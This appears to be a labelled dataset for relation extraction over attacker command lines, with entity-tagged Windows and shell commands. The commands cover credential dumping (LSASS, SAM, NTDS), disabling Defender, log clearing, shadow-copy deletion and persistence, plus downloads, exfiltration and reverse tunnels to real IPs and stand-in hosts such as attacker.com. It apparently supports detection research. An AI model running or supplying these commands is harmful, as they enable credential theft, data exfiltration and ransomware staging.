process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C copy <e2>\\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp</e2> c:\programdata\lsass.dmp
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender""</e2> /v ""ServiceKeepAlive"" /t REG_DWORD /d 0x0 /f"
process-process-fork(e1,e2)	<e1>powershell</e1> <e2>Get-ADComputer</e2> -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nltest</e2> /domain_trusts /all_trusts
process-file-read(e1,e2)	<e1>%WINDIR%\system32\NOTEPAD.EXE</e1> <e2>C:\Decryption_INFO.txt</e2>
process-file-read(e1,e2)	<e1>notepad_57.exe</e1> <e2>C:\Users\admin\notes_57.txt</e2>
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>/tmp/malware.sh</e2>
process-file-exec(e1,e2)	<e1>rundll32_43.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat</e2> /SC ONSTART /F"
process-file-read(e1,e2)	<e1>reg_9.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-write(e1,e2)	cmd_62.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_62.bat</e2>
process-socket-receive(e1,e2)	cmd.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
process-process-fork(e1,e2)	"<e1>python.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>python3</e2> -m http.server 8080 --bind http://attacker.com/c2
process-file-exec(e1,e2)	<e1>C:\ProgramData\AnyDesk.exe</e1> --install <e2>C:\ProgramData\Any</e2> --start-with-win --silent
process-file-read(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>net</e1> group <e2>""enterprise admins""</e2> /domain"
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender""</e2> /v ""DisableAntiVirus"" /t REG\_DWORD /d ""1"" /f"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>Remove-Item</e2> /usr/local/bin/backdoor -Force
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist""</e2> /v InnLine /t REG_DWORD /d 0 /f"
process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>/usr/local/bin/backdoor</e2> -Force
process-file-exec(e1,e2)	"<e1>rundll32.exe</e1> <e2>""C:\Users\REDACTED\AppData\Local\REDACTED\ikaqkk.dll"",update</e2> /i:""TimberMule\license.dat"""
process-file-write(e1,e2)	"<e1>powershell_85.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_85.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-exec(e1,e2)	"<e1>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</e1> /noconfig /fullpaths <e2>@""C:\Users\<REDACTED>\AppData\Local\Temp\npfdesjp\npfdesjp.cmdline""</e2>"
process-process-fork(e1,e2)	"<e1>rundll32.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"""
Other	cmd.exe /q /c download <e1>c:\users\<user>\documents\<doc></e1> /home/kali/desktop/<doc> 1> <e2>\\127.0.0.1\admin$\<num>.<num></e2> 2>&1
process-file-exec(e1,e2)	"<e1>powershell.exe</e1> -Command ""Start-Process <e2>/usr/local/bin/backdoor""</e2>"
Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c <e2>""taskkill</e2> /f /im explorer.exe"""
process-file-read(e1,e2)	<e1>nuclei</e1> -l <e2>rac_drdo_il_govnet</e2> -o rac_drdo_il_govnet_18-sept-23_op -s critical,high
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""DOMAINCONTROLLER""</e2> process call create C:\3.exe"
process-process-fork(e1,e2)	<e1>cmd_11.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_11.txt
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /v fDenyTSConnections /t REG_DWORD /d 0 /f"
process-file-write(e1,e2)	"<e1>powershell_22.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_22.ps1',</e2> 'Invoke-Mimikatz')"""
process-process-unlink(e1,e2)	rundll32.exe <e1>taskkill</e1> /IM <e2>notepad.exe</e2> /F
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/namespace:\\root\SecurityCenter2</e2> PATH AntiSpywareProduct GET /value
process-process-fork(e1,e2)	<e1>cmd_12.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_12.bat
process-file-chmod(e1,e2)	svchost.exe <e1>icacls</e1> <e2>/tmp/malware.sh</e2> /grant Everyone:F
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>7za.exe</e1> a -tzip -mx5 c:\programdata\lsass.zip <e2>c:\programdata\lsass.dmp</e2>
process-file-chmod(e1,e2)	<e1>c:\windows\system32\wevtutil.exe</e1> set-log <e2>hardwareevents</e2> /enabled:false
Other	psexec.exe <e1>\\<IP ADDRESS></e1> -u <DOMAIN>\Administrator -p <PASSWORD> -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\ttsel.exe</e2>
process-socket-send(e1,e2)	<e1>zero.exe</e1> [TARGET_DC_NETBIOS_NAME] <e2>[TARGET_DC_MACHINE_ACCOUNT$]</e2> administrator -c whoami
process-file-write(e1,e2)	<e1>cmd.exe</e1> /q /c upload c:\users\<user>\documents\<doc> /home/kali/desktop/<doc> 1> <e2>\\127.0.0.1\admin$\<num>.<num></e2> 2>&1
process-file-unlink(e1,e2)	cmd.exe /c <e1>wevtutil</e1> cl <e2>system</e2>
process-process-fork(e1,e2)	<e1>c:\windows\system32\cmd.exe</e1> /c <e2>fsutil</e2> behavior set symlinkevaluation r2l:1
process-file-write(e1,e2)	"<e1>python_30.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_30.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-socket-send(e1,e2)	rundll32.exe <e1>curl</e1> -X POST --data 'ping' <e2>http://attacker.com/c2</e2>
Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C AdFind.exe -f ""objectcategory=person"" sAMAccountName name displayName givenName department description title mail logonCount -csv > <e2>person.csv</e2>"
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in <e2>(C:\ProgramData\servers_live.txt)</e2> do net view \\%i /all >> C:\ProgramData\servers_live_netview.txt
process-process-unlink(e1,e2)	"<e1>C:\Windows\system32\net1</e1> stop <e2>""samss""</e2> /y"
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat</e2> /sc MINUTE /mo 720 /F"
process-socket-send(e1,e2)	<e1>ping</e1> -n 1 <e2><REDACTED>shell</e2> wmic /node:<REDACTED> process get executablepath
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> 190.114.254.116
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>rm</e2> /usr/local/bin/backdoor
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
process-file-write(e1,e2)	cmd.exe /c <e1>fsutil</e1> behavior set <e2>SymlinkEvaluation</e2> R2L:1
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
process-file-exec(e1,e2)	wmic.exe process call create <e1>'regsvr32</e1> -s <e2>C:\Users\Public\microsoft.security'</e2>
process-process-fork(e1,e2)	<e1>cmd</e1> /C > C:\ProgramData\1.txt 2>&1 <e2>reg</e2> query HKEY_USERS\\<SID>\Network
process-file-write(e1,e2)	"start PsExec.exe -accepteula @C:\share$\comps1.txt -u ""domain\User"" -p ""$PASSWORD"" <e1>cmd</e1> /c COPY ""\\DOMAINCONTROLLER\share$\fQumH.exe"" <e2>""C:\windows\temp""</e2>"
process-file-read(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save <e2>hklm\security</e2> c:\ProgramData\security.save"" /f"
process-file-exec(e1,e2)	<e1>rundll32_78.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""TSAdvertise"" /d 1 /f"
process-file-unlink(e1,e2)	powershell.exe <e1>rm</e1> <e2>C:\ProgramData\updater.exe</e2>
process-file-read(e1,e2)	"schtasks.exe /Create /RU ""NT AUTHORITY\SYSTEM"" /tn juqpxmakfk /tr <e1>""regsvr32.exe</e1> -s <e2>C:\Users\REDACTED\ocrafh.html</e2>"" /SC ONCE /Z /ST 14:20 /ET 14:32"
process-socket-send(e1,e2)	"<e1>restic.exe</e1> -r <e2>rest:http://195.123.226.84:8000/</e2> --password-file ppp.txt --use-fs-snapshot --verbose backup ""F:\Shares\<REDACTED>\<REDACTED>"""
process-process-fork(e1,e2)	"<e1>schtasks.exe</e1> /create /sc minute /mo 1 /tn ""SSH Key Exchange"" /rl highest /tr <e2>""C:\ProgramData\sshd\ssh.exe</e2> -i C:\ProgramData\sshd\config\keys\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"""
process-file-exec(e1,e2)	"<e1>python.exe</e1> -Command ""Start-Process <e2>/var/tmp/hide.so""</e2>"
Other	procdump64.exe -accepteula -ma <e1>lsass.exe</e1> <e2>C:\ProgramData\lsass.dmp</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>C:\ProgramData\AnyDesk.exe</e2> --install C:\ProgramData\AnyDesk --start-with-win --silent
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nltest</e2> /dclist:[Domain Name]
process-process-inject(e1,e2)	wmic.exe <e1>dllinjector.exe</e1> -p <e2>svchost.exe</e2> -d payload.dll
process-process-inject(e1,e2)	<e1>python.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
process-file-write(e1,e2)	"<e1>powershell_32.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_32.ps1',</e2> 'Invoke-Mimikatz')"""
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.service.exe</e2> /F
process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
process-socket-receive(e1,e2)	cmd.exe <e1>nc</e1> -lvp 4444 -s <e2>https://evil.server/payload</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>nc</e2> -lvp 4444 -s 10.10.10.10:4444
process-file-write(e1,e2)	cmd.exe /Q /c <e1>expand</e1> cache.cab -F:* <e2>c:\programdata</e2>
process-file-read(e1,e2)	"<e1>svchost.exe</e1> --config svchost.conf --progress --no-check-certificate copy <e2>""\\ServerName\C\ShareName""</e2> ftp1:/DomainName/FILES/C/ShareName"
process-file-read(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /c <e2>%PUBLIC%\Music\share$\COPY.bat</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>systeminfo</e2>
process-file-unlink(e1,e2)	cmd.exe <e1>rm</e1> <e2>/var/tmp/hide.so</e2>
process-file-write(e1,e2)	<e1>ping</e1> -n 1 hostname3 >> <e2>C:\programdata\log.txt</e2>
process-file-write(e1,e2)	<e1>mshta_68.exe</e1> -write <e2>C:\Users\Public\hta_payload_68.hta</e2>
Other	<e1>C:\Windows\system32\cmd.exe</e1> /C 7za.exe a -tzip -mx5 <e2>c:\programdata\lsass.dmp</e2> c:\programdata\lsass.zip
process-socket-send(e1,e2)	svchost.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> 10.10.10.10:4444
process-socket-send(e1,e2)	torify <e1>nuclei</e1> -u <e2>mossad.gov.il</e2> -o mossad.gov.il_new
process-file-read(e1,e2)	"start <e1>PsExec.exe</e1> -accepteula -d <e2>@C:\share$\comps5.txt</e2> -u ""domain\User"" -p ""$PASSWORD"" cmd /c ""C:\windows\temp\fQumH.exe"""
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>del</e2> C:\Windows\Temp\evil.dll
process-process-fork(e1,e2)	<e1>C:\malware\locker.exe</e1> -m - <e2>net</e2> -p \\TARGETHOST\C$
Other	"C:\Windows\system32\cmd.exe /C cool.exe <e1>[DC IP ADDRESS]</e1> [DOMAIN NAME] Administrator -c <e2>""taskkill</e2> /f /im explorer.exe"""
process-file-write(e1,e2)	<e1>c:\windows\system\procdump.exe</e1> -accepteula -ma lsass.exe <e2>lsass.dmp</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>rm</e2> C:\ProgramData\updater.exe
process-process-inject(e1,e2)	cmd.exe <e1>dllinjector.exe</e1> -p <e2>winlogon.exe</e2> -d payload.dll
process-file-write(e1,e2)	"<e1>reg.exe</e1> add <e2>hkcu\software\classes\ms-settings\shell\open\command</e2> /ve /d ""reg.exe save hklm\system c:\ProgramData\system.save"" /f"
process-file-write(e1,e2)	<e1>c:\windows\temp\procdump64.exe</e1> -accepteula -ma lsass.exe <e2>fwtsqmfile00.dmp</e2>
process-file-chmod(e1,e2)	svchost.exe <e1>chmod</e1> 777 <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> runas /user:admin <e2>powershell.exe</e2>
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd <e2>%appdata%\Microsoft</e2> && mkdir Network
process-file-read(e1,e2)	python.exe <e1>dllinjector.exe</e1> -p explorer.exe -d <e2>payload.dll</e2>
process-file-read(e1,e2)	<e1>reg_14.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-read(e1,e2)	<e1>7z_21.exe</e1> x <e2>C:\Users\Public\archive_21.7z</e2> -so > nul
process-socket-receive(e1,e2)	python.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> 10.10.10.10:4444
Other	<e1>C:\Windows\system32\cmd.exe</e1> /C ping <e2>190.114.254.116</e2>
process-file-chmod(e1,e2)	powershell.exe <e1>attrib</e1> +s +h <e2>/tmp/malware.sh</e2>
process-socket-send(e1,e2)	torify <e1>nuclei</e1> -u <e2>shabak.gov.il</e2> -o shabak.gov.il_new
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Remove-Item</e2> /usr/local/bin/backdoor -Force
process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> 31b925aa0f7 > <e2>\\.\pipe\8945a5</e2>
process-file-write(e1,e2)	"powershell.exe <e1>""ntdsutil.exe</e1> 'ac i ntds' 'ifm' 'create full <e2>c:\users\public\ntds'</e2> q q"""
process-file-unlink(e1,e2)	rundll32.exe <e1>del</e1> <e2>C:\ProgramData\updater.exe</e2>
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>rundll32.exe</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> C:\Windows\Temp\evil.dll
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /c ""bitsadmin /transfer ds ""\\REDACTED\share$\ds.exe"" ""%APPDATA%\ds.exe"" && <e2>""%APPDATA%\ds.exe""</e2> -pass REDACTED"""
process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
process-file-chmod(e1,e2)	python.exe <e1>chmod</e1> 777 <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 192.168.1.100:8080
process-file-exec(e1,e2)	C:\Windows\System32\cmd.exe /c <e1>rundll32.exe</e1> <e2>C:\ProgramData\x86.dll</e2>, StartA
process-process-fork(e1,e2)	"schtasks /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr <e1>""cmd.exe</e1> /C <e2>certutil.exe</e2> -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"""
process-process-fork(e1,e2)	<e1>powershell.exe</e1> /c start <e2>svchost.exe</e2>
process-file-write(e1,e2)	<e1>net</e1> user <e2>DefaultAccount</e2> P@ssw0rd12341234;
process-file-write(e1,e2)	<e1>certutil_40.exe</e1> -encode input_40.txt <e2>C:\temp\encoded_40.txt</e2>
process-file-exec(e1,e2)	<e1>c:\windows\system32\windowspowershell\v1.0\powershell.exe</e1> -exec bypass <e2>.\apply.ps1</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp""</e2> /t REG_DWORD /v ""MaxInstanceCount"" /d 0xffffffff /f"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>chmod</e2> 777 /tmp/malware.sh
process-file-write(e1,e2)	<e1>ftp_55.exe</e1> -s:script_55.txt <e2>C:\inetpub\wwwroot\ftp_55.log</e2>
process-file-read(e1,e2)	"<e1>net</e1> group <e2>""enterprise admins""</e2> /domain"
Other	C:\Windows\system32\cmd.exe /C for /f %%i in <e1>(C:\ProgramData\servers_live.txt)</e1> do dir \\%%i\C$ >> <e2>C:\ProgramData\servers_live_dir.txt</e2>
process-file-read(e1,e2)	<e1>reg_1.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
Other	"%WINDIR%\system32\cmd.exe /C .\rclone.exe copy <e1>""E:\REDACTED\domain""</e1> <e2>mega:REDACTED/domain</e2> -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
process-socket-send(e1,e2)	<e1>python.exe</e1> Invoke-WebRequest -Uri <e2>192.168.1.100:8080</e2> -Method POST
process-file-read(e1,e2)	<e1>cmd_55.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> dllinjector.exe -p <e2>notepad.exe</e2> -d payload.dll
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>Remove-Item</e2> C:\Windows\Temp\evil.dll -Force
process-file-write(e1,e2)	<e1>ftp_63.exe</e1> -s:script_63.txt <e2>C:\inetpub\wwwroot\ftp_63.log</e2>
process-file-write(e1,e2)	cmd_57.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_57.bat</e2>
process-file-read(e1,e2)	svchost.exe <e1>dllinjector.exe</e1> -p explorer.exe -d <e2>payload.dll</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> runas /user:admin <e2>svchost.exe</e2>
process-file-chmod(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>attrib</e1> +S +H <e2>%appdata%\Microsoft\Network</e2>
process-process-fork(e1,e2)	"<e1>reg.exe</e1> add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e2>""reg.exe</e2> save hklm\system c:\ProgramData\system.save"" /f"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> nbproc > \\.\pipe\nbproc
process-file-read(e1,e2)	<e1>ntdsAudit.exe</e1> <e2>ntds.dit</e2> -s SYSTEM -p pwddump.txt -u users.csv
process-socket-send(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /K copy ttsel.exe <e2>\\<IP>\c\windows\temp\</e2>
process-socket-send(e1,e2)	"<e1>PsExec.exe</e1> /accepteula -d <e2>\\REDACTED</e2>  -u ""domain.local\Administrator"" -p ""REDACTED"" cmd /c COPY /Y ""\\REDACTED\share$\ds.exe"" ""%PUBLIC%\Music"""
process-process-fork(e1,e2)	<e1>wmic.exe</e1> runas /user:admin <e2>cmd.exe</e2>
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>sqlceip.exe</e2> /F
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeamnfssvc.exe</e2> /F
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> Stop-Process -Name <e2>notepad.exe</e2> -Force
process-file-exec(e1,e2)	<e1>python.exe</e1> -exec <e2>/tmp/malware.sh</e2>
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""Veeam Backup Catalog Data Service""</e2> /y"
process-file-exec(e1,e2)	<e1>wmic.exe</e1> /c start <e2>C:\ProgramData\updater.exe</e2>
process-socket-receive(e1,e2)	powershell.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
process-file-read(e1,e2)	"<e1>powershell_80.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_80.yaml""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>DEL</e2> %USERPROFILE%\AppData\1.bat
process-socket-send(e1,e2)	<e1>WMIC</e1> <e2>/Node:localhost</e2> /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
process-socket-send(e1,e2)	"schtasks.exe /create /sc minute /mo 1 /tn ""SSH Key Exchange"" /rl highest /tr <e1>""C:\ProgramData\sshd\ssh.exe</e1> -i C:\ProgramData\sshd\config\keys\id_rsa -N -R 369:127.0.0.1:2222 <e2>root@185.206.146.129</e2> -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"""
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>dllinjector.exe</e2> -p lsass.exe -d payload.dll
process-file-unlink(e1,e2)	"cmd.exe /c <e1>rmdir</e1> /S /Q <e2>""C:\Windows\system32\config\systemprofile\EmailStorage_REDACTED-REDACTED_REDACTED""</e2>"
process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /C <e2>dir</e2> \\[REDACTED HOST]\c\users >> listing.txt
process-file-unlink(e1,e2)	cmd.exe /c <e1>vssadmin.exe</e1> <e2>Delete Shadows</e2> /all /quiet
process-file-write(e1,e2)	"<e1>powershell_9.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_9.txt</e2> -Value 'infected'"""
process-file-read(e1,e2)	<e1>Import-Module</e1> <e2>C:\windows\system32\powershellintelmodule.psm1</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' http://attacker.com/c2
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>icacls</e2> /tmp/malware.sh /grant Everyone:F
process-file-read(e1,e2)	<e1>7z_58.exe</e1> x <e2>C:\Users\Public\archive_58.7z</e2> -so > nul
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>c:\programdata\payload\_cr1.dll,DllInstall</e2>
Other	"<e1>%WINDIR%\system32\cmd.exe</e1> /C .\rclone.exe copy ""E:\REDACTED\domain"" <e2>mega:REDACTED/domain</e2> -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
process-file-write(e1,e2)	<e1>nuclei</e1> -l rac_drdo_il_govnet -o <e2>rac_drdo_il_govnet_18-sept-23_op</e2> -s critical,high
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>rm</e2> C:\Windows\Temp\evil.dll
process-socket-receive(e1,e2)	"<e1>netsh</e1> advfirewall firewall add rule name=""rdp"" dir=in protocol=tcp <e2>localport=3389</e2> action=allow"
process-process-unlink(e1,e2)	<e1>schtasks</e1> /delete /tn <e2>Microsoft\Windows\Windows Defender\Windows Defender Verification</e2> /f
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c ls 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-process-fork(e1,e2)	"<e1>schtasks.exe</e1> /create /sc minute /mo 1 /tn ""SSH Server"" /rl highest /tr <e2>""C:\ProgramData\sshd\sshd.exe</e2> -f C:\ProgramData\sshd\config\sshd_config"""
process-process-unlink(e1,e2)	<e1>sc</e1> config <e2>MSExchangeDelivery</e2> start= disabled
process-file-write(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save hklm\sam <e2>c:\users\REDACTED\appdata\local\temp\1\dznuxujzr</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>dllinjector.exe</e2> -p lsass.exe -d payload.dll
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>Remove-Item</e2> C:\Windows\Temp\evil.dll -Force
process-process-fork(e1,e2)	<e1>powershell.exe</e1> runas /user:admin <e2>svchost.exe</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>Remove-Item</e2> C:\ProgramData\updater.exe -Force
process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>C:\Users\Public\runme.bat</e2>
process-file-chmod(e1,e2)	powershell.exe <e1>icacls</e1> <e2>C:\ProgramData\updater.exe</e2> /grant Everyone:F
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>Remove-Item</e2> /tmp/malware.sh -Force
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>python3</e2> -m http.server 8080 --bind https://evil.server/payload
process-file-write(e1,e2)	"<e1>powershell_48.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_48.ps1',</e2> 'Invoke-Mimikatz')"""
process-socket-receive(e1,e2)	svchost.exe <e1>nc</e1> -lvp 4444 -s <e2>10.10.10.10:4444</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
process-file-write(e1,e2)	"<e1>powershell_37.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_37.ps1',</e2> 'Invoke-Mimikatz')"""
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>echo</e2> 92d8cc45954 > \\.\pipe\446b3c
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nslookup</e2>
process-file-read(e1,e2)	<e1>wscript_84.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_84.config</e2>
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</e2> /v *a /t REG_SZ /d ""cmd.exe /c C:\<REDACTED-COMPANY-NAME>.exe"" /f"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>attrib</e2> +s +h /usr/local/bin/backdoor
